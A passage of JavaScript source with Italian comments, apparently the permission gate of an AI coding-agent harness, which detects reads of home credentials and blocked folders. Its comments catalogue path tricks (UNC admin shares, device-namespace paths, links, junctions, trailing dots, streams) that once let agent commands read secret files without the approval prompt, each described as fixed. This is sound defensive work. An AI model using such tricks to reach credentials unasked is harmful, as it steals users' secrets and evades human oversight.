 *   cartella e non dal comando (`agent/file_safety.py:251-262`). Un lettore che lancia qui risponde «no»: il tetto non è una carta in Accesso pieno.
 */
function nominaLaCartellaDeiBiglietti(comando) {
  try {
    for (const parola of paroleDaGiudicare(String(comando ?? ''))) {
      if (CHIAVE_DEI_BIGLIETTI.test(parola)) return true;
      const nomi = parola.split('/').filter(Boolean);
      if (nomi.some((nome, i) => nomeCortoDeiBiglietti(nome, i === nomi.length - 1) === 'cartella')) return true;
      if (globDellaCartellaDeiBiglietti(nomi)) return true;
    }
    return false;
  } catch {
    return false;
  }
}
/** Una parola già letta come la shell: può voler dire il comando dei biglietti, la loro cartella o una chiave? */
function parolaDeiBiglietti(parola) {
  if (COMANDO_DEI_BIGLIETTI.test(parola) || CHIAVE_DEI_BIGLIETTI.test(parola) || nominaLaChiave(parola)) return true;
  const nomi = parola.split('/').filter(Boolean);
  if (nomi.some((nome, i) => nomeCortoDeiBiglietti(nome, i === nomi.length - 1))) return true;
  const base = nomi.at(-1) ?? '';
  /* un nome scritto per intero l'ha già trovato la riga sopra: da qui contano i glob e i jolly */
  const proprie = lettereScritte(base.replace(/\.m?js$/iu, ''));
  if ((proprie.lettere >= 1 || proprie.classi >= 2) && NOMI_DEL_COMANDO.some((nome) => combaciatoreDelSegmento(base, true)(nome))) return true;
  /* la chiave `<porta>.chiave`: la porta non si sa, si guarda l'estensione dopo l'ultimo punto scritto; S5: e una radice che può essere una porta */
  const estensione = base.slice(base.lastIndexOf('.') + 1);
  const sue = lettereScritte(estensione);
  const radice = base.slice(0, base.lastIndexOf('.')).split(/[=@:,;\\]/u).at(-1);
  if (base.includes('.') && sue.lettere + sue.classi >= 3 && radiceDaPorta(radice) && combaciatoreDelSegmento(estensione, true)('chiave')) return true;
  /* la cartella delle chiavi */
  return globDellaCartellaDeiBiglietti(nomi);
}
/** `'nomina'` (una parola può voler dire il comando, la cartella o la chiave), `'troppo-complesso'` (un tetto, o il lettore che lancia: si chiede lo stesso) o `false`. */
function nominaIlComandoDeiBiglietti(comando) {
  try {
    for (const parola of paroleDaGiudicare(String(comando ?? ''))) if (parolaDeiBiglietti(parola)) return 'nomina';
    return false;
  } catch {
    /* un cancello non lancia mai; nel dubbio chiede, e la carta dice perché (blocco dopo, punto 3) */
    return 'troppo-complesso';
  }
}
/** La segnalazione del comando dei biglietti: il `percorso` di sempre (è la chiave del consenso), il perché per la frase. */
const segnalazioneDeiBiglietti = (esito) => ({ classe: 'segreto', percorso: 'biglietto-talos', perche: esito === 'troppo-complesso' ? 'troppo-complesso' : 'biglietti', [ESITO_DEI_BIGLIETTI]: esito });
/*
 * ⛔ S10 della revisione cloud della PR 20 (04/11/2026): in Accesso pieno il kernel chiama `motivoDaChiedere` e poi `credenzialeDellaCasaLetta` sullo stesso comando
 *   (`talosHarness.mjs`, «credenzialeLetta»), e la guardia dei biglietti, la più cara (fino a quattro letture e 32 testi annidati), girava due volte. `motivoDaChiedere`
 *   la fa per PRIMA e risponde subito se scatta: la sua risposta dice già l'esito. Il segno è un simbolo: non esce in JSON, non arriva alla carta né al client.
 */
const ESITO_DEI_BIGLIETTI = Symbol('esitoDeiBiglietti');

/** La credenziale della casa che questa scrittura toccherebbe (`{ percorso }`, il percorso reale), o `null`. */
export function scritturaDiUnaCredenziale(percorso, { cartella, home = homeDiSistema(), realpathFn = realpathSyncNativa } = {}) {
  if (typeof percorso !== 'string' || percorso.trim() === '' || typeof home !== 'string' || home === '') return null;
  const reale = (p) => { try { return percorsoRealeAncheSeManca(p, realpathFn); } catch { return p; } };
  let assoluto;
  if (isAbsolute(percorso)) assoluto = risolvi(percorso);
  else if (typeof cartella === 'string' && cartella !== '') assoluto = risolvi(cartella, percorso);
  else return null;
  return credenzialeSottoLaCasa(reale(assoluto), reale(risolvi(home))) ? { percorso: reale(assoluto) } : null;
}

/** Il confronto a parole con l'elenco: `assoluto` sta sotto `casa` e nomina una credenziale (mai `.ssh/config`)? */
function credenzialeSottoLaCasa(assoluto, casa) {
  return credenzialeDellaCasaToccata(assoluto, casa) !== null;
}

/** La voce dell'elenco che `assoluto` tocca (`{ voce, profondita }`: i pezzi di `assoluto` sotto la casa), o `null`. */
function credenzialeDellaCasaToccata(assoluto, casa) {
  const relativo = relativoA(casa, assoluto);
  if (relativo === '' || relativo.startsWith('..') || isAbsolute(relativo)) return null;
  const confronta = (x) => (process.platform === 'win32' ? x.toLowerCase() : x);
  /* senza lo stream di NTFS (K1) e senza il punto o lo spazio in coda, che Windows toglie aprendo (`.ssh.\id_rsa` è `.ssh\id_rsa`) */
  const segmenti = relativo.split(/[\\/]+/u).map((x) => confronta(x.replace(/:.*$/su, '').replace(/[. ]+$/u, ''))).filter(Boolean);
  const unito = segmenti.join('/');
  if (CREDENZIALI_DELLA_CASA.chiedono.includes(unito)) return null;
  if (segmenti.length === 1 && CREDENZIALI_DELLA_CASA.file.includes(segmenti[0])) return { voce: segmenti[0], profondita: 1 };
  const voce = CREDENZIALI_DELLA_CASA.cartelle.find((c) => unito === c || unito.startsWith(`${c}/`));
  return voce ? { voce, profondita: segmenti.length } : null;
}

/*
 * ⛔ Riverifica 2 del bugfixer (16/10/2026 notte, su 889bfe188): grafie dello STESSO disco locale che il confronto a parole non
 *   riconosceva, e che leggevano una credenziale senza carta in Full access:
 *   - `\\?\C:\…` e `\\.\C:\…` (lo spazio dei nomi di Win32 scritto per esteso);
 *   - `\\localhost\C$\…`, `\\127.0.0.1\C$\…`, `\\?\UNC\localhost\C$\…` (la condivisione amministrativa della macchina stessa);
 *   - `/mnt/c/…` (WSL) e `/c/…` (Git Bash), solo su Windows;
 *   - `%HOMEDRIVE%%HOMEPATH%` e `$env:HOMEDRIVE$env:HOMEPATH` (la casa in due pezzi).
 *   Qui si riportano al disco `C:\…` prima del confronto; il punto e lo spazio in coda a un segmento (Windows li toglie) li toglie
 *   `credenzialeDellaCasaToccata`. ⛔ Restano dichiarati: la casa Linux dentro WSL (`\\wsl$\…`, un'altra macchina) e i nomi corti 8.3
 *   (`PROGRA~1`), che a parole non si ricostruiscono senza toccare il disco.
 */
/*
 * ⛔ Riverifica 3 (16/10/2026 notte): sfuggivano ancora il NOME di questa macchina (`\\DESKTOP-…\C$`, il più realistico), ogni indirizzo
 *   di `127.0.0.0/8` e le sue forme corte (`\\127.0.0.2\C$`, `\\127.1\C$`), le graffe di PowerShell (`${env:USERPROFILE}`) e il percorso
 *   relativo al disco senza barra (`C:Users\…`, letto dalla radice: chiedere in più in un caso raro è il verso sicuro).
 */
const nomeDellaMacchina = (() => { try { return hostname(); } catch { return ''; } })();
const PER_ESPRESSIONE = (testo) => testo.replace(/[.*+?^${}()|[\]\\]/gu, '\\$&');
const QUESTA_MACCHINA = new RegExp(String.raw`^\\\\(?:[?.]\\UNC\\)?(?:localhost|127(?:\.\d{1,3}){1,3}|\[?::1\]?|0--1\.ipv6-literal\.net`
  + (nomeDellaMacchina ? `|${PER_ESPRESSIONE(nomeDellaMacchina)}(?:\\.[^\\\\]*)?` : '') + String.raw`)\\([A-Za-z])\$(\\.*)?$`, 'isu');
function comeDiscoLocale(testo, home) {
  let t = testo;
  if (typeof home === 'string' && home !== '') {
    t = t.replace(/%HOMEDRIVE%%HOMEPATH%|\$env:HOMEDRIVE\$env:HOMEPATH|\$\{env:HOMEDRIVE\}\$\{env:HOMEPATH\}/giu, home);
    t = t.replace(/\$\{env:(?:USERPROFILE|HOME)\}|\$env:HOME(?![A-Za-z0-9_])/giu, home);
  }
  const b = t.replace(/\//gu, '\\');
  const esteso = /^\\\\[?.]\\([A-Za-z]:(?:\\.*)?)$/su.exec(b);
  if (esteso) return esteso[1];
  const amministrativa = QUESTA_MACCHINA.exec(b);
  if (amministrativa) return `${amministrativa[1]}:${amministrativa[2] ?? '\\'}`;
  const relativoAlDisco = /^([A-Za-z]):(?![\\/])(.+)$/su.exec(t);
  if (relativoAlDisco) return `${relativoAlDisco[1]}:/${relativoAlDisco[2]}`;
  if (process.platform === 'win32') {
    const unix = /^\/(?:mnt\/)?([A-Za-z])(\/.*)?$/su.exec(t);
    if (unix) return `${unix[1]}:${unix[2] ?? '/'}`;
  }
  return t;
}

/*
 * ⛔ Owner 16/10/2026 notte («Il progetto vince, ma non se È la cartella», dopo la revisione CRED-RI-04 del bugfixer): un progetto
 *   aperto DENTRO una cartella di credenziali (`~/.docker/mio-progetto`, `~/.config/gh/estensione`) faceva chiedere in Full access ogni
 *   lettura e ogni `npm test`. Ciò che sta sotto la radice del progetto non conta come credenziale della casa — purché la radice stia
 *   PIÙ IN BASSO della voce dell'elenco: `~/.docker` o `~/.ssh` aperti come progetto restano credenziali. `~/.docker/config.json`, fuori
 *   dal progetto, chiede ancora. Concorrenti letti nel codice: opencode `packages/core/src/file-access.ts:93-98` (tutto ciò che sta sotto
 *   il progetto è «interno»), Codex `windows-sandbox-rs/src/setup.rs:59-72` e `:1307` (toglie la cartella anche se è il progetto: lì non
 *   si lavora), Hermes `tools/approval_detection.py:20-37` (non chiede mai per LEGGERE `~/.ssh`). È opencode più la guardia che non ha.
 * ⛔ Solo le LETTURE: le scritture restano vietate come prima (`scritturaDiUnaCredenziale`).
 */
function progettoSottoUnaCredenziale(cartella, casa) {
  if (typeof cartella !== 'string' || cartella === '' || eDiRete(cartella)) return null;
  const radice = risolvi(cartella);
  const toccata = credenzialeDellaCasaToccata(radice, casa);
  if (toccata === null || toccata.voce.split('/').length >= toccata.profondita) return null;
  return radice;
}

/*
 * ⛔ Owner 16/10/2026 notte (CLI «Chiedere sempre», desktop «Sì, anche sul desktop»): LEGGERE una credenziale della casa chiede SEMPRE,
 *   anche in Full access — l'eccezione dichiarata alla regola del 12/10 «Full access non chiede mai». I segreti del progetto (`.env`)
 *   restano liberi in Full access; scriverle resta vietato sempre (`scritturaDiUnaCredenziale`).
 * ⛔ A PAROLE, senza `realpath`: risolvere un percorso che porta in rete sarebbe un contatto prima del sì (la lezione di RETE-10). Un
 *   collegamento verso una credenziale lo trova già `motivoDaChiedere` (`→ reale` / `= candidato`): il kernel confronta anche quello.
 * @returns la segnalazione nella forma di `motivoDaChiedere`, o `null`.
 */
export function credenzialeDellaCasaLetta({ tipo, percorso, comando, cartella, home = homeDiSistema(), segreto, fsSync, statFn = statSyncNativa, elencaFn = elencaSync } = {}) {
  if (typeof home !== 'string' || home === '') return null;
  const casa = risolvi(home);
  const progetto = progettoSottoUnaCredenziale(cartella, casa);
  const nelProgetto = (assoluto) => {
    if (progetto === null) return false;
    const relativo = relativoA(progetto, assoluto);
    return relativo === '' || (!relativo.startsWith('..') && !isAbsolute(relativo));
  };
  /*
   * ⛔ R7 (riverifica 3 del bugfixer, 16/10/2026 notte): un collegamento col NOME segreto (`id_ed25519`, `.npmrc` hard link verso la
   *   casa; una giunzione `ponte` → `~/.ssh` letta come `ponte/id_ed25519`) non chiedeva, perché `motivoDaChiedere` riconosce il nome e
   *   risponde senza calcolare dove porta, e qui il nome scritto stava nel progetto. Stessa falla per i nomi che segreti non sono
   *   (`gh-ponte/hosts.yml` → `~/.config/gh`). ⇒ Per ogni pezzo anche il percorso VERO (`percorsoVeroAParole`: `lstat`/`readlink`, mai
   *   aperto; `null` = porta in rete e la domanda della rete viene prima, RETE-10) e, per un file con più di un nome, la sua identità
   *   contro quelle delle credenziali della casa (`identitaDellaCasa`, la stessa degli hard link). L'esenzione del progetto vale sul
   *   percorso vero, non su quello scritto.
   */
  const fs = fsSync?.lstatSync ? fsSync : { lstatSync: lstatSyncNativa, readlinkSync: readlinkSyncNativa };
  const memoria = {};
  const veroDi = (p) => { try { return percorsoVeroAParole(p, fs); } catch { return null; } };
  /*
   * ⛔ Blocco dopo (punto 5, 04/11/2026): un comando di 200 mila caratteri con venticinquemila parole diverse costava 5-7 secondi qui, perché ogni pezzo camminava
   *   da capo tutte le cartelle sopra di sé (un `lstat` per cartella, per pezzo). Come in `segretoDiUnCollegamentoFisico` (R6): la CARTELLA si cammina una volta
   *   per comando, il nome finale con un `lstat` solo, e un nome finale che è esso stesso un collegamento si cammina per intero. Stesso percorso vero: il cammino
   *   di `percorsoVeroAParole` sulla cartella e poi sull'ultimo nome è lo stesso cammino, tagliato in due. ⛔ Una differenza sola, nel verso prudente: il tetto dei
   *   40 salti conta la cartella e l'ultimo nome separatamente, quindi una catena di collegamenti oltre i 40 salti in tutto può arrivare a un percorso dove prima
   *   si fermava. Oltre il tetto di un tratto si chiede «troppo complesso» (S3, `OLTRE_IL_TETTO`).
   */
  const cartelleVere = new Map();
  const veroDelPezzo = (assoluto) => {
    const sopra = cartellaDi(assoluto);
    if (sopra === assoluto) return veroDi(assoluto);
    if (!cartelleVere.has(sopra)) cartelleVere.set(sopra, veroDi(sopra));
    const cartellaVera = cartelleVere.get(sopra);
    if (cartellaVera === null || cartellaVera === OLTRE_IL_TETTO) return cartellaVera;
    const scritto = cartellaVera === sopra ? assoluto : join(cartellaVera, nomeBase(assoluto));
    let foglia;
    try { foglia = fs.lstatSync(scritto); } catch { return scritto; }
    return foglia.isSymbolicLink() ? veroDi(scritto) : scritto;
  };
  const casaCamminata = veroDi(casa);
  const casaVera = typeof casaCamminata === 'string' ? casaCamminata : casa;
  const credenziale = (p) => !nelProgetto(p) && (credenzialeSottoLaCasa(p, casa) || (casaVera !== casa && credenzialeSottoLaCasa(p, casaVera)));
  const stessoFileDiUnaCredenziale = (vero) => {
    try {
      const info = statFn(vero, { bigint: true });
      if (!info.isFile() || info.nlink < 2n || info.ino === 0n || info.size === 0n) return null;
      const trovato = identitaDellaCasa(home, { statFn, elencaFn, memoria }).get(`${info.dev}:${info.ino}`);
      return trovato && credenziale(trovato) ? trovato : null;
    } catch {
      return null;
    }
  };
  /** Dove il pezzo tocca una credenziale della casa (la descrizione per la carta), `OLTRE_IL_TETTO` se il cammino non arriva in fondo, o `null`. */
  const dentro = (pezzo) => {
    const scritto = String(pezzo ?? '').trim();
    const pulito = comeDiscoLocale(scritto.replace(/^["'`]+|["'`]+$/gu, ''), home);
    if (pulito === '' || eDiRete(pulito)) return null;
    const espanso = conLaHomeEspansa(pulito, home);
    if (espanso === '' || espanso.includes('://') || espanso.startsWith('//')) return null;
    const assoluto = /^[A-Za-z]:\//u.test(espanso) || espanso.startsWith('/') ? risolvi(espanso)
      : typeof cartella === 'string' && cartella !== '' ? risolvi(cartella, espanso) : null;
    if (assoluto === null) return null;
    if (credenziale(assoluto)) return scritto;
    const vero = veroDelPezzo(assoluto);
    if (vero === null || vero === OLTRE_IL_TETTO) return vero;
    if (vero !== assoluto && credenziale(vero)) return `${scritto} → ${vero}`;
    const trovato = stessoFileDiUnaCredenziale(vero);
    return trovato ? `${scritto} = ${trovato}` : null;
  };
  /*
   * ⛔ Decisione 155 dell'owner (04/11/2026, aggiornamento 17:02 del brief): questa funzione la chiama SOLO l'Accesso pieno, e lì la guardia
   *   dei biglietti (il comando, «troppo complesso», le parole con `.chiave`) non fa più carte: come Claude Code in `bypassPermissions`. Resta
   *   la 161: LEGGERE una credenziale di casa (`~/.ssh`, `~/.npmrc`, `~/.aws`… e `~/.talos-biglietti`, che sta nell'elenco) chiede ancora,
   *   ed è il cammino qui sotto. Fuori dall'Accesso pieno la guardia resta dov'era (`motivoDaChiedere`, S2/S5/S6 come sono).
   *   La cartella `~/.talos-biglietti` scritta come la shell la riscrive (glob, classi, nome corto 8.3) è la stessa credenziale: chiede,
   *   con la frase dei biglietti (`nominaLaCartellaDeiBiglietti`). Il nome del comando, `<porta>.chiave` da sola e «troppo complesso» no.
   *   S10 resta vero: con la risposta di `motivoDaChiedere` passata (anche `null`) la cartella si cerca solo se la guardia ha già detto
   *   «nomina»; un comando senza nessuna parola dei biglietti non rilegge niente.
   */
  const guardiaDetta = segreto === undefined ? 'nomina' : (segreto?.[ESITO_DEI_BIGLIETTI] ?? false);
  if (tipo === 'shell' && guardiaDetta === 'nomina' && nominaLaCartellaDeiBiglietti(comando)) {
    const segnalazione = segnalazioneDeiBiglietti('nomina');
    return { ...segnalazione, ...frasePerLaPersona(segnalazione, tipo), credenzialeDellaCasa: true };
  }
  /* blocco dopo (punto 5): lo stesso pezzo una volta sola, nell'ordine in cui compare (stessa risposta, un cammino del disco per pezzo diverso) */
  const pezzi = LETTURE.has(tipo) ? [percorso] : tipo === 'shell' ? [...new Set(pezziDelComando(comando))] : [];
  /* il bersaglio vero di un collegamento, se il controllo dei segreti l'ha già trovato */
  const bersaglio = typeof segreto?.percorso === 'string' ? segreto.percorso.split(/ (?:→|=) /u).pop() : null;
  for (const pezzo of [...pezzi, ...(bersaglio ? [bersaglio] : [])]) {
    const toccata = dentro(pezzo);
    if (toccata === null) continue;
    if (toccata === OLTRE_IL_TETTO) {
      const oltre = oltreIlTetto(String(pezzo).trim());
      return { ...oltre, ...frasePerLaPersona(oltre, tipo), credenzialeDellaCasa: true };
    }
    const segnalazione = { classe: 'segreto', percorso: segreto?.percorso?.match(/ (?:→|=) /u) ? segreto.percorso : toccata };
    return { ...segnalazione, ...frasePerLaPersona(segnalazione, tipo), credenzialeDellaCasa: true };
  }
  return null;
}

export function motivoDaChiedere({ tipo, comando, percorso, cartella, home = homeDiSistema(), accessoPieno = false, elenca, puntiNascosti, orologio, fsSync, leggiTesta } = {}) {
  const lettura = LETTURE.has(tipo);
  /* Una scrittura nomina UN percorso, come una lettura: niente espansione da shell. Restano fuori, per le scritture, l'esempio con una
     chiave dentro (scrivere non rivela il contenuto) e i due inneschi «fuori dalla cartella» (le scritture fuori hanno già il loro
     cancello, `scritturaFuoriDalProgetto` nel kernel). */
  const scrittura = SCRITTURE.has(tipo);
  const perPercorso = lettura || scrittura;
  const testo = perPercorso ? percorso : comando;
  if (typeof testo !== 'string' || testo.trim() === '') return null;
  const deiBiglietti = tipo === 'shell' ? nominaIlComandoDeiBiglietti(testo) : false;
  if (deiBiglietti) {
    const segnalazione = segnalazioneDeiBiglietti(deiBiglietti);
    return { ...segnalazione, ...frasePerLaPersona(segnalazione, tipo) };
  }
  /* `elenca`, `puntiNascosti` e `fsSync` (lstat/readlink) sono per le prove: in produzione valgono il disco vero e la regola del sistema operativo. */
  const nominato = nominaUnSegreto(testo, { home, cartella, espandi: !perPercorso, ...(elenca ? { elenca } : {}), ...(puntiNascosti === undefined ? {} : { puntiNascosti }), ...(orologio ? { orologio } : {}), ...(leggiTesta ? { leggiTesta } : {}) });
  if (nominato) return { ...nominato, ...frasePerLaPersona(nominato, tipo) };
  /* LINK-SEGRETO: il nome è innocuo, il file vero dietro un collegamento no (vedi `bersaglioSegretoDiUnCollegamento`). */
  const collegato = perPercorso ? bersaglioSegretoDiUnCollegamento(testo, { cartella, home, ...(fsSync ? { fsSync } : {}) }) : null;
  if (collegato) return { ...collegato, ...frasePerLaPersona(collegato, tipo) };
  /* HARD LINK (owner 16/10 notte): per la lettura e la scrittura di un file, e per ogni pezzo di un comando che sia un file */
  /*
   * ⛔ Blocco dopo (punto 5, 04/11/2026): un comando di 200 mila caratteri costava ~4 secondi qui, perché ogni pezzo camminava il disco da capo, anche lo stesso pezzo
   *   ripetuto mille volte. Ora i pezzi si guardano una volta sola (lo stesso pezzo dà la stessa risposta, e il primo che chiede resta il primo: l'insieme tiene
   *   l'ordine) e la memoria delle cartelle già camminate vale per tutto il comando, come vale già per una ricerca (R6). Stessa domanda, stesse risposte.
   */
  const pezziUnici = perPercorso ? [testo] : [...new Set(pezziDelComando(testo))];
  const memoriaDelComando = {};
  if (tipo !== 'elenca') {
    for (const pezzo of pezziUnici) {
      const fisico = segretoDiUnCollegamentoFisico(pezzo, { cartella, home, memoria: memoriaDelComando, ...(fsSync?.statSync ? { statFn: fsSync.statSync } : {}), ...(fsSync?.lstatSync ? { fsSync } : {}) });
      if (fisico) return { ...fisico, ...frasePerLaPersona(fisico, tipo) };
    }
  }
  if (scrittura) return null;
  /* 14/10/2026: un file d'esempio nominato da una lettura o da un comando, con una chiave vera dentro (un elenco non apre i file). */
  if (tipo !== 'elenca') {
    for (const pezzo of pezziUnici) {
      const esempio = esempioConUnaChiave(pezzo, { cartella, home, ...(leggiTesta ? { leggiTesta } : {}) });
      if (esempio) return { ...esempio, ...frasePerLaPersona(esempio, tipo) };
    }
  }
  for (const pezzo of lettura ? [...new Set(pezziDelComando(testo))] : pezziUnici) {
    const fuori = esceDalWorkspaceVersoUnNascosto(pezzo, { cartella, home });
    if (fuori) return { ...fuori, ...frasePerLaPersona(fuori, tipo) };
  }
  // D2: per una lettura il percorso è UNO (non un comando da spezzare), e fuori dalla cartella si chiede.
  const fuori = lettura && !accessoPieno ? letturaFuoriDalWorkspace(testo, { cartella, home }) : null;
  if (fuori) return { ...fuori, ...frasePerLaPersona(fuori, tipo) };
  return null;
}

export class PathPolicyError extends Error {
  constructor(message, code = 'PATH_NOT_ALLOWED') {
    super(message);
    this.name = 'PathPolicyError';
    this.code = code;
  }
}

export function isPathInside(rootRealPath, candidateRealPath) {
  const difference = relative(resolve(rootRealPath), resolve(candidateRealPath));
  return difference === '' || (
    difference !== '..'
    && !difference.startsWith(`..${sep}`)
    && !isAbsolute(difference)
  );
}

function validateRoot(root) {
  if (typeof root !== 'string' || root.trim() === '' || root.includes('\0') || !isAbsolute(root)) {
    throw new PathPolicyError('Invalid root', 'PATH_NOT_ALLOWED');
  }
  return resolve(root);
}

function validateCandidate(candidate) {
  if (typeof candidate !== 'string' || candidate.trim() === '' || candidate.includes('\0') || isAbsolute(candidate)) {
    throw new PathPolicyError('Invalid path', 'PATH_NOT_ALLOWED');
  }
  // Windows device paths, UNC e alternate data stream non sono percorsi di
  // workspace: non devono poter cambiare semantica fra API diverse.
  if (/^(?:\\\\\?\\|\\\\\.\\|\\\\)/u.test(candidate) || /(?:^|[\\/])[^\\/]+:[^\\/]*$/u.test(candidate)) {
    throw new PathPolicyError('Special path not allowed', 'PATH_NOT_ALLOWED');
  }
  return candidate;
}

/**
 * Risolve un percorso attraverso il filesystem e verifica il containment sul
 * percorso reale, quindi anche junction/symlink che puntano fuori. Per i
 * nuovi file si può usare `allowMissing`: viene risolto il genitore reale e
 * il nome finale resta dentro la radice.
 */
export async function resolveContainedRealPath(root, candidate, options = {}) {
  const rootAbsolute = validateRoot(root);
  const relativeCandidate = validateCandidate(candidate);
  const realpathFn = options.realpathFn ?? realpath;
  let rootReal;
  try { rootReal = await realpathFn(rootAbsolute); } catch { throw new PathPolicyError('Root not readable', 'PATH_ROOT_UNREADABLE'); }
  const lexical = resolve(rootReal, relativeCandidate);
  if (!isPathInside(rootReal, lexical)) throw new PathPolicyError('Percorso fuori dall’area autorizzata', 'PATH_NOT_ALLOWED');
  let realCandidate;
  try {
    realCandidate = await realpathFn(lexical);
  } catch (error) {
    if (!options.allowMissing) throw new PathPolicyError('Path not found', 'PATH_NOT_FOUND');
    const parent = dirname(lexical);
    let parentReal;
    try { parentReal = await realpathFn(parent); } catch { throw new PathPolicyError('Parent folder not found', 'PATH_NOT_FOUND'); }
    realCandidate = join(parentReal, lexical.slice(parent.length + 1));
  }
  if (!isPathInside(rootReal, realCandidate)) throw new PathPolicyError('Percorso fuori dall’area autorizzata', 'PATH_NOT_ALLOWED');
  return realCandidate;
}

/** Apre un handle soltanto dopo il controllo realpath; il chiamante è tenuto a chiuderlo. */
export async function openContainedFile(root, candidate, flags = 'r', options = {}) {
  const realCandidate = await resolveContainedRealPath(root, candidate, options);
  const openFn = options.openFn ?? open;
  let handle;
  try { handle = await openFn(realCandidate, flags); } catch { throw new PathPolicyError('File not readable', 'PATH_OPEN_FAILED'); }
  try {
    const info = await handle.stat();
    if (!info.isFile()) throw new PathPolicyError('The path is not a file', 'PATH_NOT_FILE');
    return handle;
  } catch (error) {
    await handle.close().catch(() => {});
    if (error instanceof PathPolicyError) throw error;
    throw new PathPolicyError('File not readable', 'PATH_OPEN_FAILED');
  }
}

/*
 * ⛔⛔⛔ Owner 27/10/2026 — LE CARTELLE BLOCCATE PER UN DISPOSITIVO (contratto CONTRATTO-CARTELLE-BLOCCATE-2026-10-27, giro 2, tappa B).
 *   Una cartella revocata a un dispositivo e ancora raggiungibile da un'altra consentita diventa BLOCCATA: nei giri che quel
 *   dispositivo ha mandato, gli attrezzi dei file non la toccano. Il nega vince, a ogni livello (Accesso pieno compreso) e senza carta.
 *   - Claude Code (code.claude.com/docs/en/permissions, letto il 27/10/2026): «Deny rules apply when either the requested path or the
 *     file it resolves to matches» ⇒ si guardano TUTTI E DUE, il percorso chiesto e quello vero (giunzioni e collegamenti).
 *   - Hermes (`agent/file_safety.py:280-305`, clone 2026-10-22): per realpath, uguale o per prefisso COL separatore
 *     (`resolved.startswith(realpath(p) + os.sep)`): «Documenti2» non sta dentro «Documenti».
 *   ⛔ Un percorso il cui percorso vero non si riesce a dire (un anello, un accesso negato mentre si risolve) in un giro con dei blocchi
 *     si RIFIUTA: chiuso a guasto, mai lasciato passare.
 *   ⛔ Nella casa Linux i percorsi sono di Linux: `/mnt/c/…` si confronta come `C:\…`, a parole (dichiarato).
 */
const suWindows = process.platform === 'win32';
/*
 * ⛔ Revisione del blocco 11, A-R1 (27/10/2026): nella casa Linux `cat /mnt/c/…/Utenti/./Documenti/segreto.txt` (e con `//`) NOMINAVA la
 *   bloccata e usciva 0 col contenuto, perché il confronto a parole non toglieva `.`, `..` e le barre doppie; e al contrario
 *   `…/Documenti/../libero.txt`, che esce dalla bloccata, si rifiutava. Un percorso di Linux (comincia con «/») si NORMALIZZA prima del
 *   confronto, a parole come Codex (`codex-rs/utils/absolute-path/src/absolutize.rs:26-38`, `normalize_path`: «Component::CurDir => {}»,
 *   «Component::ParentDir => { normalized.pop(); }») — `path.posix.normalize` fa lo stesso e unisce le barre doppie
 *   (nodejs.org/api/path.html, letto il 27/10/2026: «resolving '..' and '.' segments and replacing multiple separators with a single
 *   … separator. Trailing separators are preserved»: la barra in coda la toglie `perConfronto`). Si tiene solo se ne esce un
 *   `/mnt/<lettera>`: ogni altro «/…» resta com'era, e i percorsi di Windows non passano di qui (li normalizza già `resolve`).
 */
function percorsoLinuxNormalizzato(grezzo) {
  if (!grezzo.startsWith('/')) return grezzo;
  const normale = posix.normalize(grezzo);
  return /^\/mnt\/[A-Za-z](\/|$)/u.test(normale) ? normale : grezzo;
}
const perConfronto = (p) => {
  let s = String(p).replaceAll('/', '\\');
  const m = /^\\mnt\\([A-Za-z])(\\|$)/u.exec(s);
  if (m) s = `${m[1]}:\\${s.slice(m[0].length)}`;
  s = s.replace(/\\+$/u, '');
  if (/^[A-Za-z]:$/u.test(s)) s += '\\';
  return suWindows || m ? s.toLowerCase() : String(p).replace(/\/+$/u, '') || '/';
};
function dentroOUguale(percorso, radice) {
  const p = perConfronto(percorso);
  const r = perConfronto(radice);
  if (p === r) return true;
  const sep = p.includes('\\') || r.includes('\\') ? '\\' : '/';
  return p.startsWith(r.endsWith(sep) ? r : r + sep);
}

/* Un livello sopra una chiave di `perConfronto`, o `null` in cima */
function sopraDi(chiave) {
  const sep = chiave.includes('\\') ? '\\' : '/';
  const i = chiave.lastIndexOf(sep);
  if (i === -1 || chiave === sep) return null;
  const su = i === 0 ? sep : chiave.slice(0, i);
  const radice = /^[a-z]:$/u.test(su) ? su + sep : su;
  return radice === chiave ? null : radice;
}

/**
 * Molti percorsi contro molti nomi, senza disco: lo stesso confronto di `dentroOUguale`, una voce di `Set` alla volta. N2 del Mobile (01/11/2026): il confronto nome per nome andava su disco a ogni
 * coppia, e 1000 rinomine per 100 file fermavano Node 80 s. `contiene`: il percorso è uno dei nomi, o una cartella che ne contiene uno. `sotto`: è uno dei nomi, o sta dentro uno di loro.
 */
export function indiceDeiNomi(nomi) {
  const esatti = new Set();
  const conAntenati = new Set();
  for (const nome of nomi) {
    esatti.add(perConfronto(nome));
    for (let su = perConfronto(nome); su !== null && !conAntenati.has(su); su = sopraDi(su)) conAntenati.add(su);
  }
  return {
    contiene: (percorso) => conAntenati.has(perConfronto(percorso)),
    sotto: (percorso) => { for (let su = perConfronto(percorso); su !== null; su = sopraDi(su)) if (esatti.has(su)) return true; return false; },
  };
}

/**
 * La cartella bloccata che contiene `percorso` (relativo alla cartella della sessione, o assoluto): `{ radice }`, oppure
 * `{ radice, irrisolvibile: true }` se il percorso vero non si sa dire, oppure `null`. Senza blocchi, `null` senza toccare il disco.
 */
export function bloccataDa(percorso, { cartella, bloccati, realpathFn = realpathSyncNativa } = {}) {
  if (!Array.isArray(bloccati)) return null;
  const radici = bloccati.filter((b) => typeof b === 'string' && b !== '');
  if (radici.length === 0) return null;
  const intero = typeof percorso === 'string' && percorso.trim() !== '' ? percorso : '.';
  /* 31/10/2026 (Mobile, provato sul nucleo): `leggi` apre il percorso così com'è, e con gli spazi tolti un blocco su « sopra/segreta»
     guardava un'altra cartella. Node non toglie niente (ENOENT su «segreta./k.txt», misurato), ma un comando sì: cmd e PowerShell passano
     dalle regole di Win32, che tolgono punti e spazi da ogni pezzo. Si guardano tutte le forme, e ogni forma fa nome e percorso vero. */
  for (const forma of new Set([intero.trim(), intero, ...(process.platform === 'win32' ? [senzaCodeDiWindows(intero.trim())] : [])])) {
    const esito = bloccataInUnaForma(forma, { cartella, radici, realpathFn });
    if (esito) return esito;
  }
  return null;
}

const senzaCodeDiWindows = (forma) => forma.split(/([\\/])/u).map((pezzo, i) => {
  if (pezzo === '.' || pezzo === '..') return pezzo;
  const disco = i === 0 ? (/^[A-Za-z]:/u.exec(pezzo)?.[0] ?? '') : ''; // come `segmentiDi`: `C:` non è uno stream
  return disco + pezzo.slice(disco.length).replace(/:.*$/su, '').replace(/[. ]+$/u, '');
}).join('');

function bloccataInUnaForma(forma, { cartella, radici, realpathFn }) {
  const grezzo = percorsoLinuxNormalizzato(forma);
